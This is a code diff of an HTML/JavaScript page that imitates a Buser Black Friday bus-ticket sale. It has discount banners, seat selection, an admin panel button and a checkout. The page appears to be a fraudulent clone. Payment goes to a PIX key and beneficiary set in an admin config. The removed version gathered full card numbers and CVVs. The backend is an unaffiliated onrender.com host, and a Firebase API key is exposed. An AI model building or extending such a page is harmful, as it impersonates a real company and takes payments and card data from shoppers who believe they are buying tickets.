@@ -3,19 +3,26 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Black Friday 2026 | Buser</title>
+<title>Black Friday 2026 com viagens de ônibus em oferta | Buser</title>
 <link rel="preconnect" href="https://bcdn.com.br/" crossorigin>
 <link rel="preconnect" href="https://images.bcdn.com.br">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+
 <style>
-  :root{ --brand:#f11075; --brand-dark:#e70869; --grey-dark:#454545; --grey-med:#757575; --grey-light:#e0e0e0; --grey-lighter:#fafafa; --safe-top:env(safe-area-inset-top,0px); --safe-bottom:env(safe-area-inset-bottom,0px); }
+  :root{
+    --brand:#f11075; --brand-dark:#e70869; --grey-dark:#454545; --grey-med:#757575;
+    --grey-light:#e0e0e0; --grey-lighter:#fafafa; --safe-top:env(safe-area-inset-top,0px);
+    --safe-bottom:env(safe-area-inset-bottom,0px);
+  }
   *{box-sizing:border-box}
   html,body{margin:0;padding:0;font-family:'Poppins',sans-serif;color:var(--grey-dark);background:#fff}
   a{text-decoration:none;color:inherit}
   ul{list-style:none;margin:0;padding:0}
   .container{max-width:1200px;margin:0 auto;padding:0 16px;width:100%}
 
+  /* ===== TASKBAR ===== */
   .taskbar{position:fixed;top:0;left:0;right:0;z-index:35;height:calc(60px + var(--safe-top));padding-top:var(--safe-top);background-color:#fafafa;box-shadow: 0 4px 8px rgba(0,0,0,0.1);}
   .taskbar .t-content{align-items:center;display:flex;height:100%}
   .taskbar-desktop{display:flex;align-items:center;justify-content:space-between;flex-grow:1;height:100%;max-width:100%}
@@ -27,33 +34,31 @@
   @media (max-width:767px){.taskbar-desktop{display:none}.taskbar-mobile{display:flex;align-items:center;justify-content:center;width:100%}}
   @media (min-width:768px){.taskbar-mobile{display:none}}
 
+  /* ===== HEADER / BANNER ===== */
   .header{padding-top:calc(60px + var(--safe-top))}
   .header .h-container{display:flex;flex-direction:column;align-items:center;gap:16px;min-height:390px;position:relative;width:100%;}
-  .hc-background-brand{position:absolute;top:0;left:0;width:100%;height:100%;z-index:-2;background:linear-gradient(180deg, var(--brand) 0%, var(--brand) 65%, #fff 100%);}
-  .hc-video{position:absolute;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden;}
-  .hc-video picture { display: block; width: 100%; height: 100%; }
-  .hc-video img{width:100%;height:100%;object-fit:cover;object-position:center top;}
+  .hc-background-brand{position:absolute;inset:0;z-index:-2;height:calc(100% - 90px);background:linear-gradient(180deg, var(--brand) 0%, var(--brand) 65%, #fff 100%);}
+  .hc-video{position:absolute;inset:0;overflow:hidden;width:100%;z-index:-1;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:80px;}
+  .hc-video img{width:100%;max-width:1200px;height:auto;object-fit:contain;}
+  .hc-video::after {content: ""; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(241,16,117,0.2) 0%, transparent 50%, rgba(241,16,117,0.6) 100%);}
 
-  .searchbox-wrapper{width:100%;position:relative;z-index:5;padding-inline:16px;margin-top: 180px;}
-  .remote-search { width: 100%; position: relative; }
-  .remote-search form { display: flex; flex-direction: column; gap: 12px; }
-  .remote-search .rs-cities { position: relative; display: flex; flex-direction: column; gap: 0; width: 100%; }
-  .remote-search .rs-cities .rsc-city { position: relative; flex: 1; }
-  .remote-search .rs-cities .rsc-city .f-container { background: #fff; border: 1px solid var(--grey-light); padding: 16px 24px; border-radius: 24px; display: flex; align-items: center; gap: 12px; position: relative; }
-  .remote-search .rs-cities .rsc-city.is-origem .f-container { border-radius: 24px 24px 0 0; }
-  .remote-search .rs-cities .rsc-city.is-destino .f-container { border-radius: 0 0 24px 24px; border-top: none; }
-  .remote-search .rs-cities .rsc-swap-btn { position: absolute; right: 24px; top: 50%; transform: translateY(-50%); background: #fff; border: 1px solid var(--grey-light); border-radius: 50%; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 10; color: var(--brand); box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-  .remote-search .rs-cities .rsc-swap-btn:hover { background: var(--brand); color: #fff; }
-  .remote-search .rs-dates { display: flex; gap: 0; width: 100%; border: 1px solid var(--grey-light); border-radius: 24px; overflow: hidden; }
-  .remote-search .rs-dates .is-origem, .remote-search .rs-dates .is-destino { flex: 1; padding: 16px 24px; background: #fff; display: flex; align-items: center; gap: 12px; cursor: pointer; }
-  .remote-search .rs-dates .is-origem { border-right: 1px solid var(--grey-light); }
-  .remote-search .rs-submit { background: var(--brand); color: #fff; border: none; border-radius: 24px; padding: 20px; font-weight: 600; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-  .remote-search input { border: none; outline: none; font-size: 16px; font-weight: 600; font-family: 'Poppins', sans-serif; color: var(--grey-dark); width: 100%; background: transparent; }
-  .remote-search label { display: block; font-size: 11px; color: var(--grey-med); margin-bottom: 2px; font-weight: 500; }
+  .searchbox-wrapper{width:100%;position:relative;z-index:50;padding-inline:16px;margin-top: 180px;}
+  .searchbox-card{background:#fff;border-radius:24px;padding:8px;display:flex;gap:4px;align-items:center;flex-wrap:wrap;box-shadow: 0 8px 24px rgba(87,75,6,0.1);position: relative;}
+  .searchbox-field{flex:1;min-width:160px;height:74px;display: flex; flex-direction: column; justify-content: center; padding: 0 16px;border-right: 1px solid var(--grey-light); position: relative;}
+  .searchbox-field:nth-child(3) { border-right: none; }
+  .searchbox-field label { font-size: 11px; color: var(--grey-med); font-weight: 500; margin-bottom: 2px; cursor: pointer; }
+  .searchbox-field input { border: none; outline: none; font-size: 15px; font-family: 'Poppins', sans-serif; color: var(--grey-dark); width: 100%; background: transparent; font-weight: 600;}
+  .searchbox-field input::placeholder { font-weight: 400; color: #999; }
+  .swap-btn { background: #fff; border: 1px solid var(--grey-light); border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: absolute; left: 33%; top: 50%; transform: translate(-50%, -50%); z-index: 10; color: var(--brand); box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: 0.2s;}
+  .swap-btn:hover { background: var(--brand); color: #fff; border-color: var(--brand); }
+  .searchbox-btn{background: var(--brand); color: #fff; border: none; height: 58px; width: 58px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; margin: 0 8px; font-size: 20px; flex-shrink: 0; transition: transform 0.2s;}
+  .searchbox-btn:hover { transform: scale(1.05); }
+  .hcb-vantagens{display:flex;gap:40px;justify-content:center;height:16px;width:100%;font-size: 12px; color: var(--grey-dark); margin-top: 8px;}
 
-  .autocomplete-dropdown { position: absolute; top: 100%; left: 0; right: 0; background: #fff; border: 1px solid var(--grey-light); border-radius: 0 0 12px 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); z-index: 9999; max-height: 250px; overflow-y: auto; display: none; }
+  .autocomplete-dropdown {position: absolute; top: 100%; left: 0; right: 0; background: #fff;border: 1px solid var(--grey-light); border-radius: 12px; margin-top: 8px;box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 100; max-height: 250px;overflow-y: auto; display: none;}
   .autocomplete-dropdown li { padding: 12px 16px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
   .autocomplete-dropdown li:hover { background-color: #fff7fa; color: var(--brand); }
+  .autocomplete-dropdown li:last-child { border-bottom: none; }
 
   #resultados-viagem {display: none; margin-top: 40px; padding: 24px; background: #fff;border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid var(--grey-light);}
   #resultados-viagem h2 { font-size: 20px; margin: 0 0 16px; color: var(--brand); border-bottom: 2px solid var(--brand); padding-bottom: 8px; display: inline-block;}
@@ -63,6 +68,12 @@
   .trip-price { font-size: 24px; font-weight: 700; color: var(--brand); text-align: right; }
   .trip-price span { display: block; font-size: 12px; font-weight: 400; color: var(--grey-med); text-align: right; margin-bottom: 4px;}
   .btn-comprar { background: var(--brand); color: #fff; border: none; padding: 10px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px; font-family: 'Poppins';}
+
+  .preco-antigo { text-decoration: line-through; color: #999; font-size: 14px; font-weight: 400; }
+  .desconto-badge { display: inline-block; background: #40b552; color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; margin-left: 6px; }
+  .black-friday-banner { background: linear-gradient(135deg, #000 0%, #1a1a1a 100%); color: #fff; padding: 12px 20px; border-radius: 12px; margin-bottom: 16px; display: flex; align-items: center; gap: 12px; font-weight: 600; flex-wrap: wrap; }
+  .black-friday-banner .pulse { background: var(--brand); padding: 4px 10px; border-radius: 6px; font-size: 12px; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.6} }
 
   .resultados-layout { display: flex; gap: 24px; align-items: flex-start; }
   .filtros-sidebar { width: 250px; flex-shrink: 0; background: #fff; border-radius: 16px; padding: 20px; border: 1px solid var(--grey-light); }
@@ -74,28 +85,43 @@
 
   .passageiro-box { background: #f9f9f9; padding: 16px; border-radius: 8px; margin-bottom: 16px; border: 1px solid #eee; }
   .passageiro-box input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 6px; font-family: 'Poppins', sans-serif; }
-
-  .onibus { max-width: 300px; margin: 0 auto; border: 2px solid #ddd; border-radius: 16px; padding: 16px; background: #fafafa; }
-  .onibus-fileira { display: flex; justify-content: space-between; margin-bottom: 8px; align-items: center; }
-  .onibus-corredor { width: 30px; text-align: center; color: #999; font-size: 10px; }
-  .poltrona-btn { width: 40px; height: 40px; border-radius: 8px; border: 1px solid #ddd; background: #fff; color: #333; font-weight: 600; cursor: pointer; transition: 0.2s; }
+  .passageiro-box input:last-child { margin-bottom: 0; }
+  .poltrona-btn { width: 44px; height: 44px; border-radius: 8px; border: 1px solid #ddd; background: #fff; color: #333; font-weight: 600; cursor: pointer; transition: 0.15s; }
   .poltrona-btn:hover:not(:disabled) { border-color: var(--brand); }
-  .poltrona-btn.selecionada { background: var(--brand); color: #fff; border-color: var(--brand); }
-  .poltrona-btn:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+  .poltrona-btn.selecionada { background: var(--brand); color: #fff; border-color: var(--brand); transform: scale(1.05); }
+  .poltrona-btn:disabled { background: #454545; color: #fff; border-color: #454545; cursor: not-allowed; opacity: 1; }
+  .poltrona-legenda { display: flex; gap: 16px; font-size: 11px; justify-content: center; margin-bottom: 16px; color: var(--grey-med); flex-wrap: wrap; }
+  .poltrona-legenda span { display: inline-flex; align-items: center; gap: 5px; }
+  .poltrona-legenda .sw { display: inline-block; width: 14px; height: 14px; border-radius: 3px; border: 1px solid #ddd; }
+
+  .admin-fab { position: fixed; bottom: 80px; right: 16px; width: 52px; height: 52px; border-radius: 50%; background: #333; color: #fff; border: none; cursor: pointer; z-index: 9998; font-size: 22px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: flex; align-items: center; justify-content: center; }
+  @media (max-width:767px) { .admin-fab { bottom: calc(70px + var(--safe-bottom)); } }
+  .pix-display { text-align: center; margin-top: 8px; }
+  #qrcode { display: flex; justify-content: center; margin: 16px 0; }
+  #qrcode img, #qrcode canvas { border-radius: 8px; }
+  .pix-code { background: #f5f5f5; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 11px; word-break: break-all; max-height: 110px; overflow-y: auto; border: 1px solid #ddd; margin-bottom: 8px; text-align: left; }
+  .pix-actions { display: flex; flex-direction: column; gap: 8px; margin-top: 12px; }
+  .btn-copy { background: #40b552; color: #fff; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; }
+  .pix-total { font-size: 20px; font-weight: 700; color: var(--brand); margin: 8px 0; }
+  .pix-receiver { font-size: 12px; color: var(--grey-med); margin-bottom: 8px; }
 
   .cupons-carrossel{margin-top:48px}
   .carousel ul{display:grid;gap:16px;grid-auto-flow:column;grid-auto-columns:calc(100%/3 - 16px);overflow-x:auto;padding:0 16px;scrollbar-width:none;scroll-snap-type:x mandatory;}
   .carousel ul::-webkit-scrollbar{display:none}
   @media (max-width:767px){.carousel ul{grid-auto-columns:100%}}
   .cupom-img{width: 100%; border-radius: 16px; object-fit: cover; aspect-ratio: 366/183; cursor: pointer; transition: transform 0.2s;}
+  .cupom-img:hover { transform: scale(1.02); }
 
   .valores-buser{margin-top:64px;padding-top:40px; background: #fafafa; padding-bottom: 40px; border-radius: 24px;}
   .vb-head{text-align:center;margin-bottom:32px;padding-inline:24px}
   .vb-head h2 { font-size: 32px; font-weight: 600; margin: 8px 0; color: var(--brand); }
   .vb-cards{display:grid;gap:16px;grid-template-columns:repeat(3,1fr); padding: 0 24px;}
+  @media (max-width:1023px){.vb-cards{grid-template-columns:repeat(2,1fr)}}
   @media (max-width:767px){.vb-cards{grid-template-columns:1fr}}
   .vb-card{background: #fff; border: 1px solid var(--grey-light); border-radius: 16px; padding: 32px; display: flex; flex-direction: column; gap: 16px;}
   .vb-card .icon-circle{width: 64px; height: 64px; border-radius: 50%; background: #fdf6ec; display: flex; align-items: center; justify-content: center; font-size: 24px;}
+  .vb-card h3 { margin: 0; font-size: 20px; font-weight: 600; color: var(--brand); }
+  .vb-card p { margin: 0; font-size: 14px; line-height: 1.5; color: var(--grey-med); }
 
   .midia-section{display:flex;flex-direction:column;gap:24px;overflow:hidden;margin-top:64px;position:relative;padding-block:24px;}
   @media (min-width:768px){.midia-section{align-items:center;flex-direction:row;padding-block:40px}}
@@ -104,6 +130,7 @@
   .ms-items{display:grid;gap:40px;position:relative;z-index:1;width:100%}
   @media (min-width:768px){.ms-items{grid-template-columns:1fr 1fr;padding-inline:40px}}
   .ms-item{border:1px solid var(--grey-light);border-radius:16px;padding:24px;display:flex;flex-direction:column;justify-content:space-between;background: #fff; gap: 16px;box-shadow: 0 2px 8px rgba(0,0,0,0.05); cursor: pointer;}
+  .ms-item img { width: 90px; height: auto; margin-bottom: 8px; }
   .ms-background{position:absolute;bottom:0;left:0;right:0;max-height:400px;border-radius:16px;overflow:hidden;z-index:0;}
   @media (min-width:768px){.ms-background{max-width:min(660px,55vw);bottom:unset;left:unset;right:24px}}
   .ms-background img { width: 100%; height: 100%; object-fit: cover; }
@@ -115,13 +142,17 @@
   .bh-promo h1 { color: var(--brand); margin: 0 0 8px; font-size: 24px; }
   .bh-card{display:flex;flex-direction:column;gap:16px;justify-content:space-between;border:1px solid var(--grey-light);border-radius:16px;padding:24px;overflow:hidden;}
   @media (min-width:768px){.bh-card{align-items:flex-start;flex-direction:row;gap:24px}}
+  .bh-card .stores { display: flex; flex-direction: column; gap: 8px; }
   .bh-card .stores img { width: 120px; height: auto; cursor: pointer; }
   .bh-card .img-whats { width: 160px; height: 100%; object-fit: cover; border-radius: 12px; }
 
   .destinos-procurados{margin-top:64px;padding-top:40px}
+  .destinos-procurados h2 { text-align: center; font-size: 28px; margin-bottom: 32px; }
   .dp-carousel ul{grid-auto-columns:calc(100%/3 - 16px)}
+  @media (max-width:1023px){.dp-carousel ul{grid-auto-columns:calc(100%/2 - 16px)}}
   @media (max-width:767px){.dp-carousel ul{grid-auto-columns:100%}}
   .dp-card{border:1px solid var(--grey-light);border-radius:16px;padding:24px;margin-bottom:16px; background: #fff;}
+  .dp-card h3 { margin: 0 0 16px; font-size: 18px; }
   .dp-card .dp-row{display:flex;justify-content:space-between;margin-bottom:12px; font-size: 14px;}
 
   .sobre-buser{margin-top:64px}
@@ -129,20 +160,24 @@
   .ac-titulo h2 { font-size: 32px; margin: 0 0 32px; max-width: 600px; }
   .sobre-container{width:100%;max-width:700px;height:394px;border-radius:16px;overflow:hidden;position:relative;margin:0 auto;}
   .sobre-container img { width: 100%; height: 100%; object-fit: cover; }
+  .sci-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:72px;height:72px;border-radius:50%;background:rgba(0,0,0,0.7);display: flex; align-items: center; justify-content: center; color: #fff; font-size: 24px;cursor: pointer; transition: 0.2s; border: none;}
   .mpv-motivos{margin-top:48px; display: grid; gap: 24px; grid-template-columns: repeat(3, 1fr);}
   @media (max-width:767px){ .mpv-motivos{ grid-template-columns: 1fr; } }
+  .mpv-item .icon { color: var(--brand); font-size: 28px; }
 
   .seguranca-section{background:linear-gradient(132deg,var(--brand) 33.33%,var(--brand-dark) 47.36%);color:#fff;padding:32px 0;margin-top:64px;border-radius:24px;}
   .ss-container{display:flex;flex-direction:column;gap:40px;align-items:center;padding-inline:24px}
   @media (min-width:768px){.ss-container{flex-direction:row;padding-inline:48px}}
   .ssc-image{width:100%;border-radius:16px;overflow:hidden}
   .ssc-image img { width: 100%; height: 100%; object-fit: cover; }
-  .btn-white{background: #fff; color: var(--brand); padding: 14px 24px; border-radius: 16px;font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 8px;}
+  .btn-white{background: #fff; color: var(--brand); padding: 14px 24px; border-radius: 16px;font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 8px;transition: 0.2s;}
 
   .footer{margin-top:64px;padding-bottom:calc(56px + var(--safe-bottom));border-top:1px solid var(--grey-light)}
   .f-social-brand{display:flex;justify-content:space-between;align-items:center;padding:24px 0;flex-wrap:wrap;gap:16px}
-  .f-links{display:flex;gap:48px;padding:32px 0;flex-wrap:wrap}
+  .fe-social{display:flex;gap:16px; color: var(--grey-dark); font-size: 20px;}
   .ada-divider{height:1px;background:var(--grey-light);display:block;width:100%}
+  .f-links{display:flex;gap:48px;padding:32px 0;flex-wrap:wrap}
+  @media (max-width:767px){.f-links{flex-direction:column;gap:24px}}
   .fe-copyright{padding:24px 0;display:flex;justify-content:center;font-size:12px;color:var(--grey-med);text-align:center}
 
   .ada-nav-bottom{display:none;position:fixed;bottom:0;left:0;right:0;z-index:25;height:calc(56px + var(--safe-bottom));padding-bottom:var(--safe-bottom);background:#fff;box-shadow:0 -2px 3px rgba(0,0,0,0.1);justify-content: space-around; align-items: center;}
@@ -153,11 +188,13 @@
 
   @media (max-width: 767px) {
     .searchbox-wrapper { margin-top: 120px; }
+    .hc-video { padding-top: 40px; }
+    .hc-video img { max-height: 150px; object-fit: contain; }
     .header .h-container { min-height: 320px; }
-    .remote-search .rs-cities .rsc-city .f-container { padding: 12px 16px; }
-    .remote-search .rs-dates { flex-direction: column; }
-    .remote-search .rs-dates .is-origem { border-right: none; border-bottom: 1px solid var(--grey-light); border-radius: 24px 24px 0 0; }
-    .remote-search .rs-dates .is-destino { border-radius: 0 0 24px 24px; }
+    .searchbox-field { min-width: 100%; border-right: none; border-bottom: 1px solid var(--grey-light); padding: 12px 16px; height: auto; }
+    .searchbox-field:last-of-type { border-bottom: none; }
+    .searchbox-btn { width: 100%; border-radius: 16px; height: 50px; margin: 8px 0; }
+    .swap-btn { display: none; }
     .trip-card { flex-direction: column; align-items: flex-start; gap: 12px; }
     .trip-price { text-align: left; width: 100%; }
     .trip-price .btn-comprar { width: 100%; }
@@ -198,65 +235,43 @@
   <div class="h-container">
     <span class="hc-background-brand" aria-hidden="true"></span>
     <div class="hc-video" aria-hidden="true">
-      <picture>
-        <source media="(max-width: 767px)" srcset="https://images.bcdn.com.br/jA54ARzy4iz6X6kk5u-tOeS-AkA=/480x252/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/first-frame-compressed.png">
-        <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Banner Buser">
-      </picture>
+      <img src="https://images.bcdn.com.br/pItLwwNuUe3zU_I4iGqvV6UEeHU=/filters:quality(85):format(webp)/https%3A//d1q5r6jf4yxfe1.cloudfront.net/public/banners/2026/11/02/25/hero_desktop_home.png" alt="Banner Buser">
     </div>
 
     <div class="container searchbox-wrapper">
-      <div class="remote-search">
-        <form id="form-busca" autocomplete="off">
-          <div class="rs-cities">
-            <div class="rsc-city is-origem">
-              <div class="f-container">
-                <span style="color:var(--brand); font-size:20px;">📍</span>
-                <div style="flex:1;">
-                  <label for="input-origem">Origem</label>
-                  <input type="text" id="input-origem" placeholder="De onde você vai sair?" autocomplete="off">
-                </div>
-              </div>
-              <ul id="lista-origem" class="autocomplete-dropdown"></ul>
-            </div>
-            <button class="rsc-swap-btn" type="button" onclick="swapCidades()">⇅</button>
-            <div class="rsc-city is-destino">
-              <div class="f-container">
-                <span style="color:var(--brand); font-size:20px;">📍</span>
-                <div style="flex:1;">
-                  <label for="input-destino">Destino</label>
-                  <input type="text" id="input-destino" placeholder="Para onde você vai?" autocomplete="off">
-                </div>
-              </div>
-              <ul id="lista-destino" class="autocomplete-dropdown"></ul>
-            </div>
-          </div>
-          <div class="rs-dates">
-            <div class="is-origem">
-              <span style="color:var(--brand); font-size:20px;">📅</span>
-              <div>
-                <label for="input-ida">Data de ida</label>
-                <input type="text" id="input-ida" placeholder="Selecione a data" readonly>
-              </div>
-            </div>
-            <div class="is-destino">
-              <span style="color:var(--brand); font-size:20px;">📅</span>
-              <div>
-                <label for="input-volta">Data de volta <span style="font-weight:400; font-size:10px;">(Opcional)</span></label>
-                <input type="text" id="input-volta" placeholder="Selecione a data" readonly>
-              </div>
-            </div>
-          </div>
-          <button type="submit" class="rs-submit">
-            <span>Pesquisar</span>
-            <span style="font-size:18px;">🔍</span>
-          </button>
-        </form>
+      <div class="searchbox-card">
+        <div class="searchbox-field">
+          <label for="input-origem">Origem</label>
+          <input type="text" id="input-origem" placeholder="Cidade de origem" autocomplete="off">
+          <ul id="lista-origem" class="autocomplete-dropdown"></ul>
+        </div>
+        <button class="swap-btn" type="button" onclick="swapCidades()" title="Trocar origem e destino">⇅</button>
+        <div class="searchbox-field">
+          <label for="input-destino">Destino</label>
+          <input type="text" id="input-destino" placeholder="Cidade de destino" autocomplete="off">
+          <ul id="lista-destino" class="autocomplete-dropdown"></ul>
+        </div>
+        <div class="searchbox-field">
+          <label for="input-ida">Data de ida</label>
+          <input type="text" id="input-ida" placeholder="Selecione a data" readonly>
+        </div>
+        <div class="searchbox-field">
+          <label for="input-volta">Data de volta <span style="font-weight:400; font-size:10px;">(Opcional)</span></label>
+          <input type="text" id="input-volta" placeholder="Selecione a data" readonly>
+        </div>
+        <button class="searchbox-btn" id="btn-pesquisar" aria-label="Pesquisar">🔍</button>
       </div>
+    </div>
+
+    <div class="hcb-vantagens">
+      <span>✓ Parcelamento em até 12x</span>
+      <span>✓ Cancelamento fácil</span>
+      <span>✓ Embarque com QR Code</span>
     </div>
   </div>
 </header>
 
-<div class="container" id="resultados-viagem" style="display:none;">
+<div class="container" id="resultados-viagem">
   <h2 id="titulo-resultados">Resultados da busca</h2>
   <div class="resultados-layout">
     <aside class="filtros-sidebar" id="filtros-sidebar" style="display:none;">
@@ -278,7 +293,7 @@
 <div class="container valores-buser">
   <div class="vb-head"><p>Aqui é sem letras miúdas.</p><h2>É só você vivendo o seu caminho.</h2></div>
   <div class="vb-cards">
-    <div class="vb-card"><div class="icon-circle">🛡️</div><h3>Mais seguro</h3><p>Empresas e motoristas treinados e certificados pela ANTT.</p></div>
+    <div class="vb-card"><div class="icon-circle">🛡️</div><h3>Mais seguro</h3><p>Empresas e motoristas treinados e certificados pela ANTT. Ônibus com tecnologias exclusivas.</p></div>
     <div class="vb-card"><div class="icon-circle">✌️</div><h3>Prático como deve ser</h3><p>Viajar com a praticidade de comprar pelo app, sem pegar filas.</p></div>
     <div class="vb-card"><div class="icon-circle">💰</div><h3>Barato e com qualidade</h3><p>Viagens de ônibus por até menos da metade do preço das passagens de rodoviária.</p></div>
   </div>
@@ -352,6 +367,8 @@
   <a href="#" class="nb-item"><i>👤</i> Perfil</a>
 </nav>
 
+<button class="admin-fab" onclick="window.open('admin.html', '_blank')" title="Painel administrativo">⚙️</button>
+
 <!-- MODAIS -->
 <div id="modal-passageiros" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1002; align-items:center; justify-content:center;">
   <div style="background:#fff; padding:24px; border-radius:16px; max-width:600px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
@@ -371,9 +388,8 @@
 <div id="modal-poltrona" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1001; align-items:center; justify-content:center;">
   <div style="background:#fff; padding:24px; border-radius:16px; max-width:500px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
     <h2 style="color:var(--brand); margin-top:0;">Escolha sua Poltrona</h2>
-    <p style="font-size:13px; color:#666; margin-bottom:16px;">Selecione <strong id="qtd-assentos">0</strong> assentos.</p>
-    <div id="mapa-onibus" class="onibus"></div>
-    <p id="assento-escolhido" style="font-size:16px; font-weight:600; text-align:center; margin:16px 0 8px;">Nenhum assento selecionado</p>
+    <p id="poltrona-fonte" style="font-size:11px; color:var(--grey-med); margin:0 0 12px;"></p>
+    <div id="mapa-onibus" style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; margin-bottom:20px;"></div>
     <div style="display:flex; gap:8px;">
       <button onclick="fecharModalPoltrona()" style="flex:1; padding:12px; border:1px solid #ddd; background:#fff; border-radius:8px; cursor:pointer;">Cancelar</button>
       <button onclick="confirmarPoltrona()" style="flex:1; padding:12px; border:none; background:var(--brand); color:#fff; border-radius:8px; font-weight:700; cursor:pointer;">Confirmar</button>
@@ -382,425 +398,631 @@
 </div>
 
 <div id="modal-checkout" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:1000; align-items:center; justify-content:center;">
-  <div style="background:#fff; padding:32px; border-radius:16px; max-width:420px; width:100%; margin:16px;">
+  <div style="background:#fff; padding:32px; border-radius:16px; max-width:460px; width:100%; margin:16px; max-height:90vh; overflow-y:auto;">
     <h2 style="color:var(--brand); margin-top:0;">Finalizar Reserva</h2>
     <div id="checkout-info" style="margin:16px 0; font-size:14px; line-height:1.6;"></div>
     <div id="area-pix" style="display:block;">
-      <p style="font-weight:600; margin-bottom:8px;">Escolha a forma de pagamento:</p>
-      <label style="display:flex; align-items:center; gap:8px; margin-bottom:8px;"><input type="radio" name="pagamento" value="pix" checked onchange="mostrarPix()"> PIX (mais rápido)</label>
-      <label style="display:flex; align-items:center; gap:8px; margin-bottom:16px;"><input type="radio" name="pagamento" value="cartao" onchange="mostrarCartao()"> Cartão de Crédito</label>
-      <div id="area-pix-content">
-        <div id="qrcode" style="text-align:center; margin-bottom:10px;"></div>
-        <textarea id="pix-code" readonly style="width:100%; height:60px; font-size:10px; border:1px solid #ddd; border-radius:6px; padding:8px; box-sizing:border-box;"></textarea>
-        <button onclick="copiarPix()" style="width:100%; padding:10px; background:#0277bd; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; margin-top:8px;">Copiar PIX</button>
-      </div>
-      <div id="area-cartao-content" style="display:none;">
-        <input type="text" id="cartao-numero" placeholder="Número do Cartão" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:6px;">
-        <input type="text" id="cartao-nome" placeholder="Nome no Cartão" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:6px;">
-        <input type="text" id="cartao-validade" placeholder="Validade (MM/AA)" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:6px;">
-        <input type="text" id="cartao-cvv" placeholder="CVV" style="width:100%; padding:12px; margin-bottom:8px; border:1px solid #ddd; border-radius:6px;">
-        <button onclick="pagarCartao()" style="width:100%; padding:14px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer;">Pagar com Cartão</button>
-      </div>
+      <button onclick="gerarPix()" style="width:100%; padding:14px; background:var(--brand); color:#fff; border:none; border-radius:8px; font-weight:700; cursor:pointer;">Gerar PIX</button>
     </div>
     <button onclick="fecharCheckout()" style="width:100%; margin-top:12px; padding:12px; background:transparent; border:1px solid #ddd; border-radius:8px; cursor:pointer;">Cancelar</button>
   </div>
 </div>
 
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
 <script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/pt.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/6.4.3/imask.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
 <script>
-// Firebase
-const firebaseConfig = {
-  apiKey: "AIzaSyCMoq8MNOUjlhqWhjaJ24uW4grhsFFhA",
-  authDomain: "projeto-link-ddbf0.firebaseapp.com",
-  databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
-  projectId: "projeto-link-ddbf0",
-  storageBucket: "projeto-link-ddbf0.firebasestorage.app",
-  messagingSenderId: "560317126646",
-  appId: "1:560317126646:web:be9cad9c9ed350940399d7"
-};
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-const fs = firebase.firestore();
+  // ============================================================
+  // AQUECE O SERVIDOR (cold start do Render)
+  // ============================================================
+  fetch('https://buser-online.onrender.com/api/clickbus/search?origem=ping&destino=ping&data=2000-01-01').catch(() => {});
 
-let CONFIG = { descontoGlobal: 0, chavePix: '', nomeBeneficiario: '', cidadeBeneficiario: '' };
